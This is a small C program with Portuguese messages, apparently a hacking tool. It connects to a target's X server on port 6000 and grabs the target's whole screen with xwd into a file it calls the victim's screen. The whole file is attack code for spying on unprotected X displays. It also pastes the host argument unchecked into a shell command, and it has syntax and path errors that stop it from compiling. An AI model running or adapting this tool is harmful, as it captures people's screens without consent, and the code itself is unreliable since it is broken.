/*XScreen.c*/
/* SV = to Xserver*/

#include <stdio.h>
#include <stdlib.h>
#include <errno.h>
#include <string.h>
#include <netdb.h>
#include <sys/types.h>
#include <netinet/in.h>
#include <sys/socket.h>

int captX(char *ip);

int main(int argc, char *argv[]){
    if(argc < 2){
        printf("-Key.c v1.1 -\n");
        printf("Uso: %s <HosT>\n", argv[0]);
        exit(1);
    }
    system("clear");
    printf("\t ------------ Key -------------- \n\n");
    sleep(1);
    printf("Tentando conectar com o SV de %s na porta [6000]\n", argv[1]);
    printf("Aguarde... \n");
    sleep(3);
    captX(argv[1]);
}

int captX(char *ip){
    int s;
    char *comando[200];
    struct hostent *he;
    struct sockaddr_in remote;

    if((he=gethostbyname(ip)) == NULL){
        herror("gethostname");
        exit(1);
    }
    if((s = socket(AF_INET, SOCK_STREAM, 0)) == -1){
        perror("socket");
        exit(1);
    }
    remote. sin_family = AF_INET;
    remote. sin_port = htons(6000);
    remote. sin_addr = *((struct in_addr *)he->h_addr);
    bzero(&(remote. sin_zero), 8);

    if(connect(s, (struct sockaddr *)&remote, sizeof(struct sockaddr) ) == -1){
        printf("[Falhou] - SV em [%s] nao esta ativo na porta [6000]. \n\n", ip);
        exit(0);

    }
    printf("\nSV em [%s] na porta [6000] ---------- [OK\n]", ip);
    sleep(1);
    printf("Aguarde... \n\n");
    sleep(1);
    printf("Tentando captura de tela do alvo ... \n");
    sleep(1);
    printf("Aguarde... \n");
    sleep(3);

    sprintf(comando, "usr/X11R6/bin/xwd -root -display %s: 0 -out tela-vitima", ip);
    if(system(comando) == -1){
        printf("Caputa de tela [FALHOU]. %s está protegido - \n\n", ip);
        printf("Finalizando\n\n");
        exit(0);
    }
    else(
        printf("\nTela de %s capturada ...\n", ip);
        printf("O arquivo com a tela é tela-vitima \n");
        printf("Para abrir, digite na shell: xv tela-vitima\n\n");
        printf("Key.c v1.1\n");
        return 0;
    )
}


